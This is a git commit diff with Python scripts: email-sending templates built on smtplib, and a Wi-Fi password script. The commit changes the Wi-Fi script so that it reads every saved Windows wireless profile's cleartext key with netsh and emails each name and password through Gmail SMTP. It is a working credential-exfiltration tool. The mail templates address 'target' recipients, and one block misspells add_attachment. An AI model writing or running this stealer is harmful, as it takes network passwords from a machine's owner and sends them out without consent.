f9d3b794837948fb4a5c31c0ab05dff85c05a2c1
Leif Eggenfellner <leif.eggenfellner@gmail.com>
2020-11-22 19:39:16 +0100

    file upload

--- mailClient/main.py
+++ mailClient/main.py
@@ -1,7 +1,141 @@
+### ONLY TEXT ###
+
+
+import os
 import smtplib
+from email.message import EmailMessage
 
-server = smtplib.SMTP('smtp-relay.gmail.com', 25)
+EMAIL_ADDRESS = os.environ.get('EMAIL_USER')
+EMAIL_PASSWORD = os.environ.get('EMAIL_PASS')
 
-server.ehlo()
+msg = EmailMessage()
+msg['Subject'] = 'Insert Title...'
+msg['From'] = EMAIL_ADDRESS
+msg['To'] = EMAIL_ADDRESS
+msg.set_content('Insert Message...')
 
-server.login('')
+with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
+    smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
+
+    smtp.send_message(msg)
+
+
+### ONLY TEXT END ###
+
+
+
+### WITH ATTACHMENTS ###
+
+
+import os
+import smtplib
+import imghdr
+from email.message import EmailMessage
+
+EMAIL_ADDRESS = os.environ.get('EMAIL_USER')
+EMAIL_PASSWORD = os.environ.get('EMAIL_PASS')
+
+msg = EmailMessage()
+msg['Subject'] = 'Insert Title...'
+msg['From'] = EMAIL_ADDRESS
+msg['To'] = EMAIL_ADDRESS
+msg.set_content('Insert Message...')
+
+files = ['img1.jpg', 'img2.png']
+
+for file in files:
+    with open(file, 'rb') as f:
+        file_data = f.read()
+        file_type = imghdr.what(f.name)
+        file_name = f.name
+
+    msg.add_attachment(file_data, maintype='image',
+                       subtype=file_type, filename=file_name)
+
+
+### IF PDF FILE ###
+
+
+files = ['file.pdf']
+
+for file in files:
+    with open(file, 'rb') as f:
+        file_data = f.read()
+        file_name = f.name
+
+        msg.add_attachement(file_data, maintype='application',
+                            subtype='octet-stream', filename=file_name)
+
+
+### IF PDF FILE END ###
+
+
+with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
+    smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
+
+    smtp.send_message(msg)
+
+
+### WITH ATTACHMENTS END ###
+
+
+
+### SEND TO MULTIPLE PEOPLE ###
+
+
+import os
+import smtplib
+from email.message import EmailMessage
+
+EMAIL_ADDRESS = os.environ.get('EMAIL_USER')
+EMAIL_PASSWORD = os.environ.get('EMAIL_PASS')
+
+contacts = ['target@gmail.com', 'target2@hotmail.com']
+
+msg = EmailMessage()
+msg['Subject'] = 'Insert Title...'
+msg['From'] = EMAIL_ADDRESS
+msg['To'] = ', '.join(contacts)
+msg.set_content('Insert Message...')
+
+with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
+    smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
+
+    smtp.send_message(msg)
+
+
+### SEND TO MULTIPLE PEOPLE END ###
+
+
+
+### WITH HTML ###
+
+import os
+import smtplib
+from email.message import EmailMessage
+
+EMAIL_ADDRESS = os.environ.get('EMAIL_USER')
+EMAIL_PASSWORD = os.environ.get('EMAIL_PASS')
+
+msg = EmailMessage()
+msg['Subject'] = 'Insert Title...'
+msg['From'] = EMAIL_ADDRESS
+msg['To'] = EMAIL_ADDRESS
+msg.set_content('This is a plain text email')
+
+msg.add_alternative("""\
+    <!DOCTYPE html>
+    <html>
+        <body>
+            <h1 style="color:#0F0;">This is an HTML Email!</h1>
+        </body>
+    </html>
+""", subtype='html')
+
+with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
+    smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
+
+    smtp.send_message(msg)
+
+
+### WITH HTML END ###
--- wifiPasswords/main.py
+++ wifiPasswords/main.py
@@ -1,4 +1,15 @@
 import subprocess
+import os
+import smtplib
+from email.message import EmailMessage
+
+EMAIL_ADDRESS = os.environ.get('EMAIL_USER')
+EMAIL_PASSWORD = os.environ.get('EMAIL_PASS')
+
+msg = EmailMessage()
+msg['Subject'] = 'WifiPasswords'
+msg['From'] = EMAIL_ADDRESS
+msg['To'] = EMAIL_ADDRESS
 
 data = subprocess.check_output(
     ['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
@@ -6,12 +17,19 @@ data = subprocess.check_output(
 wifis = [line.split(':')[1][1:-1]
          for line in data if 'All User Profile' in line]
 
-for wifi in wifis:
-    results = subprocess.check_output(
-        ['netsh', 'wlan', 'show', 'profile', wifi, 'key=clear']).decode('utf-8').split('\n')
-    results = [line.split(':')[1][1:-1]
-               for line in results if "Key Content" in line]
-    try:
-        print(f'Name: {wifi}, Password: {results[0]}')
-    except:
-        print(f'Name: {wifi}, Password: Cannot be read!')
+
+with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
+    smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
+
+    for wifi in wifis:
+        results = subprocess.check_output(
+            ['netsh', 'wlan', 'show', 'profile', wifi, 'key=clear']).decode('utf-8').split('\n')
+        results = [line.split(':')[1][1:-1]
+                   for line in results if "Key Content" in line]
+        try:
+            msg.set_content(f'Name: {wifi}, Password: {results[0]}')
+            smtp.send_message(msg)
+
+        except:
+            msg.set_content(f'Name: {wifi}, Password: Cannot be read!')
+            smtp.send_message(msg)
